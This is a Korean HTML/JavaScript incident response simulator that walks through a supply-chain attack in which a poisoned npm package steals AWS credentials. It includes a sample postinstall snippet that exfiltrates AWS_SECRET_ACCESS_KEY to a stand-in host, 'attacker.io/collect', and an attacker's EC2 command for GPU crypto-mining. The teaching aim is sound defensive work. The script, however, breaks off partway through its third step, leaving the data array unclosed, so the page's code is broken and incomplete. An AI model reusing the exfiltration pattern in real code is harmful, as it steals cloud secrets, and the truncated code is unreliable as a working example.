<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>공급망 공격 사고 대응 시뮬레이터</title>
<style>
:root {
  --p: #e0e0e0;
  --s: #a0a0a0;
  --t: #707070;
  --bg2: #2a2a2a;
  --b: #404040;
  --color-text-primary: #e0e0e0;
  --color-text-secondary: #a0a0a0;
  --color-text-tertiary: #707070;
  --color-text-info: #85B7EB;
  --color-text-danger: #F09595;
  --color-text-success: #97C459;
  --color-text-warning: #EF9F27;
  --color-background-primary: #1a1a1a;
  --color-background-secondary: #2a2a2a;
  --color-background-tertiary: #111111;
  --color-background-info: #0C447C;
  --color-background-danger: #791F1F;
  --color-background-success: #27500A;
  --color-background-warning: #633806;
  --color-border-primary: rgba(255,255,255,0.4);
  --color-border-secondary: rgba(255,255,255,0.3);
  --color-border-tertiary: rgba(255,255,255,0.15);
  --font-sans: system-ui, -apple-system, sans-serif;
  --font-mono: ui-monospace, monospace;
  --border-radius-md: 8px;
  --border-radius-lg: 12px;
  --border-radius-xl: 16px;
}

*, *::before, *::after { box-sizing: inherit; }

body {
  margin: 0;
  padding: 1rem;
  font-family: var(--font-sans);
  background: var(--color-background-primary);
  color: var(--color-text-primary);
  box-sizing: border-box;
  min-height: 100vh;
}

button {
  background: transparent;
  border: 0.5px solid var(--color-border-secondary);
  border-radius: var(--border-radius-md);
  color: var(--color-text-primary);
  padding: 6px 14px;
  font-size: 14px;
  cursor: pointer;
  font-family: var(--font-sans);
}
button:hover { background: var(--color-background-secondary); }
button:active { transform: scale(0.98); }

/* Layout */
.app-header {
  margin-bottom: 1.25rem;
}
.app-header h1 {
  margin: 0 0 0.25rem 0;
  font-size: 1.15rem;
  font-weight: 600;
  color: var(--color-text-primary);
  letter-spacing: -0.01em;
}
.app-header p {
  margin: 0;
  font-size: 0.8rem;
  color: var(--color-text-tertiary);
}

.main-grid {
  display: grid;
  grid-template-columns: 260px 1fr;
  grid-template-rows: auto;
  gap: 1rem;
  align-items: start;
}

/* Timeline panel */
.timeline-panel {
  background: var(--color-background-secondary);
  border: 0.5px solid var(--color-border-tertiary);
  border-radius: var(--border-radius-lg);
  padding: 1rem;
}

.timeline-title {
  font-size: 0.7rem;
  font-weight: 600;
  text-transform: uppercase;
  letter-spacing: 0.08em;
  color: var(--color-text-tertiary);
  margin: 0 0 1rem 0;
}

.timeline-list {
  position: relative;
  list-style: none;
  margin: 0;
  padding: 0;
}

.timeline-connector {
  position: absolute;
  left: 14px;
  top: 28px;
  bottom: 28px;
  width: 1px;
  background: var(--color-border-tertiary);
}

.timeline-item {
  display: flex;
  align-items: flex-start;
  gap: 10px;
  padding: 6px 0;
  cursor: pointer;
  border-radius: var(--border-radius-md);
  position: relative;
  z-index: 1;
  transition: opacity 0.2s;
}
.timeline-item:hover .tl-label { color: var(--color-text-primary); }

.tl-node {
  flex-shrink: 0;
  width: 28px;
  height: 28px;
  border-radius: 50%;
  border: 1.5px solid var(--color-border-tertiary);
  background: var(--color-background-primary);
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 0.65rem;
  font-weight: 700;
  color: var(--color-text-tertiary);
  transition: all 0.3s ease;
}

.tl-info {
  flex: 1;
  min-width: 0;
  padding-top: 4px;
}
.tl-label {
  font-size: 0.78rem;
  font-weight: 500;
  color: var(--color-text-secondary);
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
  transition: color 0.2s;
  line-height: 1.3;
}
.tl-time {
  font-size: 0.67rem;
  color: var(--color-text-tertiary);
  margin-top: 2px;
  font-variant-numeric: tabular-nums;
}

/* Timeline states */
.timeline-item.done .tl-node {
  background: var(--color-background-success);
  border-color: var(--color-text-success);
  color: var(--color-text-success);
}
.timeline-item.active .tl-node {
  border-color: var(--color-text-info);
  color: var(--color-text-info);
  box-shadow: 0 0 0 3px rgba(133, 183, 235, 0.15);
}
.timeline-item.active .tl-label {
  color: var(--color-text-primary);
  font-weight: 600;
}
.timeline-item.undetected .tl-node {
  border-color: var(--color-text-danger);
  color: var(--color-text-danger);
  animation: blink 1.4s ease-in-out infinite;
}
.timeline-item.undetected .tl-label { color: var(--color-color-text-danger); }

@keyframes blink {
  0%, 100% { box-shadow: 0 0 0 0 rgba(240, 149, 149, 0); }
  50% { box-shadow: 0 0 0 4px rgba(240, 149, 149, 0.25); }
}

/* Elapsed badge */
.elapsed-badge {
  display: flex;
  align-items: center;
  gap: 4px;
  padding: 2px 6px;
  background: var(--color-background-tertiary);
  border-radius: 4px;
  font-size: 0.62rem;
  color: var(--color-text-tertiary);
  margin: 2px 0 2px 8px;
  width: fit-content;
}
.elapsed-badge::before {
  content: '⏱';
  font-size: 0.6rem;
}

/* Detail panel */
.detail-panel {
  background: var(--color-background-secondary);
  border: 0.5px solid var(--color-border-tertiary);
  border-radius: var(--border-radius-lg);
  padding: 1.25rem;
  min-height: 420px;
}

.step-header {
  display: flex;
  align-items: center;
  gap: 10px;
  margin-bottom: 1rem;
}

.step-badge {
  flex-shrink: 0;
  font-size: 0.68rem;
  font-weight: 700;
  padding: 3px 8px;
  border-radius: 4px;
  text-transform: uppercase;
  letter-spacing: 0.05em;
}
.badge-undetected { background: var(--color-background-danger); color: var(--color-text-danger); }
.badge-detected  { background: var(--color-background-info);   color: var(--color-text-info); }
.badge-contain   { background: var(--color-background-danger);  color: var(--color-text-danger); }
.badge-investigate { background: var(--color-background-info); color: var(--color-text-info); }
.badge-recover   { background: var(--color-background-success); color: var(--color-text-success); }
.badge-reissue   { background: var(--color-background-success); color: var(--color-text-success); }
.badge-postmortem { background: var(--color-background-secondary); color: var(--color-text-secondary); border: 0.5px solid var(--color-border-tertiary); }

.step-title {
  font-size: 1rem;
  font-weight: 700;
  margin: 0;
  color: var(--color-text-primary);
}

.step-time-label {
  margin-left: auto;
  font-size: 0.72rem;
  color: var(--color-text-tertiary);
  font-variant-numeric: tabular-nums;
  white-space: nowrap;
}

.step-desc {
  font-size: 0.85rem;
  color: var(--color-text-secondary);
  line-height: 1.65;
  margin: 0 0 1rem 0;
}

.section-label {
  font-size: 0.68rem;
  font-weight: 700;
  text-transform: uppercase;
  letter-spacing: 0.08em;
  color: var(--color-text-tertiary);
  margin: 0 0 0.4rem 0;
}

.code-block {
  background: var(--color-background-tertiary);
  border: 0.5px solid var(--color-border-tertiary);
  border-radius: var(--border-radius-md);
  padding: 0.75rem 1rem;
  font-family: var(--font-mono);
  font-size: 0.75rem;
  line-height: 1.6;
  overflow-x: auto;
  margin: 0 0 1rem 0;
  white-space: pre;
  color: var(--color-text-secondary);
}
.code-block .kw  { color: #C97BF0; }
.code-block .cmd { color: #85B7EB; }
.code-block .flag { color: #EF9F27; }
.code-block .val  { color: #97C459; }
.code-block .cmt  { color: #606060; }
.code-block .str  { color: #F09595; }

.key-points {
  list-style: none;
  margin: 0;
  padding: 0;
  display: flex;
  flex-direction: column;
  gap: 6px;
}
.key-points li {
  display: flex;
  align-items: flex-start;
  gap: 8px;
  font-size: 0.82rem;
  color: var(--color-text-secondary);
  line-height: 1.5;
}
.key-points li::before {
  content: '→';
  color: var(--color-text-tertiary);
  flex-shrink: 0;
  margin-top: 1px;
}

/* Nav buttons */
.nav-row {
  display: flex;
  align-items: center;
  gap: 8px;
  margin-top: 1.25rem;
  padding-top: 1rem;
  border-top: 0.5px solid var(--color-border-tertiary);
}
.nav-row .step-counter {
  font-size: 0.75rem;
  color: var(--color-text-tertiary);
  margin-left: auto;
  font-variant-numeric: tabular-nums;
}
.btn-prev, .btn-next, .btn-reset {
  padding: 6px 16px;
  font-size: 0.82rem;
}
.btn-next {
  background: var(--color-background-info);
  border-color: var(--color-text-info);
  color: var(--color-text-info);
}
.btn-next:hover { background: #0f5a9e; }
.btn-reset { color: var(--color-text-tertiary); font-size: 0.75rem; }

/* Dashboard */
.dashboard {
  grid-column: 1 / -1;
  background: var(--color-background-secondary);
  border: 0.5px solid var(--color-border-tertiary);
  border-radius: var(--border-radius-lg);
  padding: 1rem 1.25rem;
}

.dash-header {
  display: flex;
  align-items: center;
  gap: 1rem;
  margin-bottom: 0.85rem;
}
.dash-title {
  font-size: 0.7rem;
  font-weight: 700;
  text-transform: uppercase;
  letter-spacing: 0.08em;
  color: var(--color-text-tertiary);
  margin: 0;
}

.metric-chips {
  display: flex;
  gap: 8px;
  margin-left: auto;
  flex-wrap: wrap;
}
.metric-chip {
  display: flex;
  align-items: center;
  gap: 5px;
  padding: 3px 9px;
  border-radius: 5px;
  font-size: 0.72rem;
  font-weight: 600;
  font-variant-numeric: tabular-nums;
}
.chip-mttd { background: var(--color-background-info);    color: var(--color-text-info); }
.chip-mttr { background: var(--color-background-warning);  color: var(--color-text-warning); }
.chip-total { background: var(--color-background-secondary); border: 0.5px solid var(--color-border-tertiary); color: var(--color-text-secondary); }

.bar-area {
  display: flex;
  flex-direction: column;
  gap: 6px;
}

.bar-row {
  display: flex;
  align-items: center;
  gap: 10px;
}
.bar-row-label {
  font-size: 0.7rem;
  color: var(--color-text-tertiary);
  width: 38px;
  flex-shrink: 0;
  text-align: right;
}
.bar-track {
  flex: 1;
  height: 20px;
  background: var(--color-background-tertiary);
  border-radius: 4px;
  overflow: hidden;
  display: flex;
  position: relative;
}
.bar-fill {
  height: 100%;
  border-radius: 4px;
  transition: width 0.5s cubic-bezier(0.4,0,0.2,1);
  display: flex;
  align-items: center;
  justify-content: flex-end;
  padding-right: 6px;
  min-width: 0;
  overflow: hidden;
}
.bar-fill-mttd { background: var(--color-background-info); }
.bar-fill-mttr { background: var(--color-background-warning); }
.bar-val {
  font-size: 0.65rem;
  font-weight: 600;
  white-space: nowrap;
  opacity: 0;
  transition: opacity 0.3s 0.4s;
}
.bar-fill.has-width .bar-val { opacity: 1; }
.bar-val-mttd { color: var(--color-text-info); }
.bar-val-mttr { color: var(--color-text-warning); }

.bar-row-time {
  font-size: 0.68rem;
  color: var(--color-text-tertiary);
  width: 44px;
  flex-shrink: 0;
  font-variant-numeric: tabular-nums;
}

.bar-legend {
  display: flex;
  gap: 14px;
  margin-top: 4px;
  justify-content: flex-end;
}
.legend-item {
  display: flex;
  align-items: center;
  gap: 5px;
  font-size: 0.68rem;
  color: var(--color-text-tertiary);
}
.legend-dot {
  width: 8px;
  height: 8px;
  border-radius: 2px;
  flex-shrink: 0;
}
.dot-mttd { background: var(--color-background-info); border: 1px solid var(--color-text-info); }
.dot-mttr { background: var(--color-background-warning); border: 1px solid var(--color-text-warning); }
</style>
</head>
<body>

<div class="app-header">
  <h1>공급망 공격 — 사고 대응 타임라인 시뮬레이터</h1>
  <p>npm 패키지 감염으로 인한 AWS 자격증명 유출 시나리오를 단계별로 체험합니다.</p>
</div>

<div class="main-grid">

  <!-- 좌측: 타임라인 -->
  <aside class="timeline-panel">
    <p class="timeline-title">사고 타임라인</p>
    <ul class="timeline-list" id="timelineList">
      <div class="timeline-connector"></div>
      <!-- JS로 렌더링 -->
    </ul>
  </aside>

  <!-- 우측: 상세 패널 -->
  <section class="detail-panel" id="detailPanel">
    <!-- JS로 렌더링 -->
  </section>

  <!-- 하단: 대시보드 -->
  <section class="dashboard">
    <div class="dash-header">
      <p class="dash-title">MTTD / MTTR 대시보드</p>
      <div class="metric-chips">
        <span class="metric-chip chip-mttd">MTTD <span id="chipMttd">—</span></span>
        <span class="metric-chip chip-mttr">MTTR <span id="chipMttr">—</span></span>
        <span class="metric-chip chip-total">총 노출 <span id="chipTotal">—</span></span>
      </div>
    </div>
    <div class="bar-area">
      <div class="bar-row">
        <span class="bar-row-label">MTTD</span>
        <div class="bar-track">
          <div class="bar-fill bar-fill-mttd" id="barMttd">
            <span class="bar-val bar-val-mttd" id="barMttdLabel"></span>
          </div>
        </div>
        <span class="bar-row-time" id="timeMttd">—</span>
      </div>
      <div class="bar-row">
        <span class="bar-row-label">MTTR</span>
        <div class="bar-track">
          <div class="bar-fill bar-fill-mttr" id="barMttr">
            <span class="bar-val bar-val-mttr" id="barMttrLabel"></span>
          </div>
        </div>
        <span class="bar-row-time" id="timeMttr">—</span>
      </div>
    </div>
    <div class="bar-legend">
      <span class="legend-item"><span class="legend-dot dot-mttd"></span>유출 → 탐지 (MTTD)</span>
      <span class="legend-item"><span class="legend-dot dot-mttr"></span>탐지 → 봉쇄 (MTTR)</span>
    </div>
  </section>

</div>

<script>
// ──────────────────────────────────────────
// 데이터 정의
// ──────────────────────────────────────────
const TOTAL_HOURS = 27; // 바 차트 기준 최대 시간

const STEPS = [
  {
    id: 1,
    label: '공급망 감염',
    time: 'T+0h',
    offsetHours: 0,
    badge: 'undetected',
    badgeText: '미탐지',
    title: '① 공급망 감염 — npm 패키지 오염',
    desc: 'CI/CD 파이프라인이 사용하는 <code>popular-lib@3.2.1</code> 패키지가 공격자에 의해 오염되었습니다. 패키지 설치 시 postinstall 훅이 실행되어 환경변수로부터 <code>AWS_SECRET_ACCESS_KEY</code>를 수집하고, 공격자 서버로 유출합니다. 이 시점에서는 아무런 알림도 발생하지 않습니다.',
    code: `<span class="cmt"># package.json의 의존성 — 감염된 버전</span>
{
  <span class="str">"dependencies"</span>: {
    <span class="str">"popular-lib"</span>: <span class="val">"^3.2.0"</span>  <span class="cmt">← 3.2.1로 업데이트됨</span>
  }
}

<span class="cmt"># 감염 패키지의 postinstall 스크립트 (숨겨진 코드)</span>
<span class="kw">const</span> stolen = process.env.<span class="flag">AWS_SECRET_ACCESS_KEY</span>;
<span class="cmd">fetch</span>(<span class="str">'https://attacker.io/collect'</span>, { body: stolen });`,
    points: [
      '공급망 공격은 정상적인 설치 과정에서 조용히 실행됩니다',
      'CI 환경에는 광범위한 권한의 AWS 자격증명이 환경변수로 주입됩니다',
      '패키지 무결성 검증 없이는 감지가 불가능합니다',
    ],
    state: 'undetected',
    mttdHours: null,
    mttrHours: null,
  },
  {
    id: 2,
    label: '공격자 활동',
    time: 'T+12h',
    offsetHours: 12,
    badge: 'undetected',
    badgeText: '미탐지',
    title: '② 공격자 활동 — 탈취한 키 악용',
    desc: '공격자는 탈취한 <code>AWS_SECRET_ACCESS_KEY</code>로 us-east-1 리전에서 대규모 EC2 인스턴스를 생성합니다. GPU 최적화 인스턴스(p3.2xlarge) 20대를 스팟으로 실행하여 암호화폐 채굴을 시작합니다. 비용이 급등하고 있지만 아직 탐지되지 않았습니다.',
    code: `<span class="cmt"># 공격자가 탈취한 키로 실행하는 명령</span>
<span class="cmd">aws</span> ec2 run-instances \\
  <span class="flag">--image-id</span> <span class="val">ami-0abcdef1234567890</span> \\
  <span class="flag">--instance-type</span> <span class="val">p3.2xlarge</span> \\
  <span class="flag">--count</span> <span class="val">20</span> \\
  <span class="flag">--region</span> <span class="val">us-east-1</span> \\
  <span class="flag">--user-data</span> <span class="val">file://mine.sh</span>

<span class="cmt"># 이 시점 예상 비용: ~$230/시간 (p3.2xlarge × 20)</span>`,
    points: [
      '공격자는 비정상적 리전과 인스턴스 타입을 사용합니다',
      'CloudTrail에는 기록되지만 실시간 알림이 없으면 놓칩니다',
      '비용 예산 알림이 없다면 수일간 탐지되지 않을 수 있습니다',
    ],
    state: 'undetected',
    mttdHours: null,
    mttrHours: null,
  },
  {
    id: 3,
    label: '탐지 — GuardDuty',
    time: 'T+24h',
    offsetHours: 24,
    badge: 'detected',
    badgeText: '탐지',
    title: '③ 탐지 — GuardDuty 알림 수신',
    desc: 'AWS GuardDuty가 "<strong>UnauthorizedAccess:IAMUser/MaliciousIPCaller</strong>" 이벤트를 발생시킵니다. 알려진 악성 IP에서 자격증명이 사용된 것을 감지했습니다. SNS → Lambda → Slack 파이프라인을 통해 보안팀 채널에 알림이 도착합니다. <strong>MTTD = 24시간</strong>.',
    code: `<span class="cmt"># GuardDuty 알림 페이로드 (Slack 수신)</span>
{
  <span class="str">"type"</span>: <span class="val">"UnauthorizedAccess:IAMUser/MaliciousIPCaller"</span>,
  <span class="str">"severity"</span>: <span class="val">8.0</span>,
  <span class="str">"region"</span>: <span class="val">"us-east-1"</span>,
  <span class="str">"accessKeyId"</span>: <span class="val">"AKIA..."</span>,
  <span class="str">"remoteIpDetails"</span>: {
    <span class="str">"ipAddressV4"</span>: <span class="val">"198.51.100.42"</span>,
    <span class="str">"organization"</span>: <span class="val">"TOR Exit Node"</span>
  }
}`,
    points: [
      'GuardDuty는 이미 알려진 악성 IP 패턴에만 빠르게 반응합니다',
      '알림 → Slack 파이프라인이 없었다면 이메일로만 수신됩니다',
      '비용 예산 알림($100 초과 등)이 있었다면 12h 전에 탐지 가능했습니다',

// ──────────────────────────────────────────
// 상태
// ──────────────────────────────────────────
let currentStep = 0;

// ──────────────────────────────────────────
// 타임라인 렌더
// ──────────────────────────────────────────
function renderTimeline() {
  const list = document.getElementById('timelineList');
  list.innerHTML = '<div class="timeline-connector"></div>';

  STEPS.forEach((step, idx) => {
    // 상태 결정
    let cls = '';
    if (idx < currentStep) cls = 'done';
    else if (idx === currentStep) {
      cls = (step.state === 'undetected') ? 'undetected active' : 'active';
    } else {
      cls = '';
    }

    // 아이콘
    let nodeContent = step.id;
    if (idx < currentStep) nodeContent = '✓';

    const li = document.createElement('li');
    li.className = `timeline-item ${cls}`;
    li.onclick = () => { currentStep = idx; render(); };

    li.innerHTML = `
      <div class="tl-node">${nodeContent}</div>
      <div class="tl-info">
        <div class="tl-label">${step.label}</div>
        <div class="tl-time">${step.time}</div>
      </div>
    `;
    list.appendChild(li);

    // 경과 시간 배지 (단계 사이)
    if (idx < STEPS.length - 1) {
      const nextOffset = STEPS[idx + 1].offsetHours;
      const elapsed = nextOffset - step.offsetHours;
      const elapsedText = formatHours(elapsed);
      const badge = document.createElement('div');
      badge.className = 'elapsed-badge';
      badge.style.marginLeft = '38px';
      badge.textContent = `+${elapsedText}`;
      list.appendChild(badge);
    }
  });
}

// ──────────────────────────────────────────
// 상세 패널 렌더
// ──────────────────────────────────────────
function renderDetail() {
  const step = STEPS[currentStep];
  const panel = document.getElementById('detailPanel');

  const pointsHTML = step.points.map(p => `<li>${p}</li>`).join('');
  const hasCode = step.code && step.code.trim() !== '';

  panel.innerHTML = `
    <div class="step-header">
      <span class="step-badge badge-${step.badge}">${step.badgeText}</span>
      <h2 class="step-title">${step.title}</h2>
      <span class="step-time-label">${step.time}</span>
    </div>

    <p class="step-desc">${step.desc}</p>

    ${hasCode ? `
    <p class="section-label">실행 명령어</p>
    <div class="code-block">${step.code}</div>
    ` : ''}

    <p class="section-label">핵심 포인트</p>
    <ul class="key-points">${pointsHTML}</ul>

    <div class="nav-row">
      <button class="btn-reset" onclick="reset()">↺ 처음으로</button>
      <button class="btn-prev" onclick="prevStep()" ${currentStep === 0 ? 'disabled style="opacity:0.3;cursor:default;"' : ''}>← 이전</button>
      <button class="btn-next" onclick="nextStep()" ${currentStep === STEPS.length - 1 ? 'disabled style="opacity:0.3;cursor:default;"' : ''}>다음 →</button>
      <span class="step-counter">${currentStep + 1} / ${STEPS.length}</span>
    </div>
  `;
}

// ──────────────────────────────────────────
// 대시보드 렌더
// ──────────────────────────────────────────
function renderDashboard() {
  const step = STEPS[currentStep];
  const mttd = step.mttdHours;
  const mttr = step.mttrHours;

  const chipMttd = document.getElementById('chipMttd');
  const chipMttr = document.getElementById('chipMttr');
  const chipTotal = document.getElementById('chipTotal');

  const barMttd = document.getElementById('barMttd');
  const barMttr = document.getElementById('barMttr');
  const barMttdLabel = document.getElementById('barMttdLabel');
  const barMttrLabel = document.getElementById('barMttrLabel');
  const timeMttd = document.getElementById('timeMttd');
  const timeMttr = document.getElementById('timeMttr');

  if (mttd === null) {
    chipMttd.textContent = '—';
    chipMttr.textContent = '—';
    chipTotal.textContent = '—';
    barMttd.style.width = '0%';
    barMttr.style.width = '0%';
    barMttd.classList.remove('has-width');
    barMttr.classList.remove('has-width');
    barMttdLabel.textContent = '';
    barMttrLabel.textContent = '';
    timeMttd.textContent = '—';
    timeMttr.textContent = '—';
    return;
  }

  // MTTD 바
  const mttdPct = Math.min((mttd / TOTAL_HOURS) * 100, 100);
  barMttd.style.width = mttdPct + '%';
  chipMttd.textContent = formatHours(mttd);
  timeMttd.textContent = formatHours(mttd);
  barMttdLabel.textContent = formatHours(mttd);
  setTimeout(() => barMttd.classList.add('has-width'), 50);

  // MTTR 바
  if (mttr !== null) {
    const mttrPct = Math.min((mttr / TOTAL_HOURS) * 100, 100);
    barMttr.style.width = mttrPct + '%';
    chipMttr.textContent = formatHours(mttr);
    timeMttr.textContent = formatHours(mttr);
    barMttrLabel.textContent = formatHours(mttr);
    setTimeout(() => barMttr.classList.add('has-width'), 50);

    const total = mttd + mttr;
    chipTotal.textContent = formatHours(total);
  } else {
    barMttr.style.width = '0%';
    barMttr.classList.remove('has-width');
    barMttrLabel.textContent = '';
    chipMttr.textContent = '측정 중';
    chipTotal.textContent = '측정 중';
    timeMttr.textContent = '—';
  }
}

// ──────────────────────────────────────────
// 유틸
// ──────────────────────────────────────────
function formatHours(h) {
  if (h === 0) return '0m';
  const hours = Math.floor(h);
  const mins = Math.round((h - hours) * 60);
  if (hours === 0) return `${mins}m`;
  if (mins === 0) return `${hours}h`;
  return `${hours}h ${mins}m`;
}

function nextStep() {
  if (currentStep < STEPS.length - 1) { currentStep++; render(); }
}
function prevStep() {
  if (currentStep > 0) { currentStep--; render(); }
}
function reset() {
  currentStep = 0; render();
}

function render() {
  renderTimeline();
  renderDetail();
  renderDashboard();
}

// ──────────────────────────────────────────
// 키보드 지원
// ──────────────────────────────────────────
document.addEventListener('keydown', (e) => {
  if (e.key === 'ArrowRight' || e.key === 'ArrowDown') { e.preventDefault(); nextStep(); }
  if (e.key === 'ArrowLeft'  || e.key === 'ArrowUp')   { e.preventDefault(); prevStep(); }
});

// 초기 렌더
render();
</script>
